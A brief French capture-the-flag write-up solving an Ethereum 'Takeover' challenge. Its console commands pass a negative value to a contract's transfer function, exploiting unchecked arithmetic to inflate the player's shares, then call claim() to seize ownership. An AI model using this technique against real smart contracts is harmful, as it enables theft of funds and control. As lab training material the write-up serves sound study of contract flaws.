# Ethereum - Takeover

## 30 Points
### So much shares

## Énoncé
SafeMath is always a better idea !

## Solution

On va dans un premier temps récuppérer l'adresse de l'owner, dans l'objectif d'en apprendre un peu plus avec les autres fonctions/

```Bash
level.owner().then(console.log)
```

On obtient donc l'adresse de l'owner, on va donc voir ce qu'il possède dans shares:

```Bash
level.getShares('ownerAddress').then(console.log)
```

On donc essayer de transférer ce qu'il a sur son adresse, à notre adresse:

```Bash
level.transfer('ownerAddress', -70).then(console.log)
```

En suite on vérifie que le transfer a bien marché:
```Bash
level.getShares('ownerAddress').then(cosole.log)
```

Comme on a vu que l'on a plus de shares que le owner, on peut donc appeler la fonction claim et récupérer le pouvoir.

```Bash
level.claim().then(console.log)
```

Après tout cela on peut appuyer sur **next** et a voir le flag.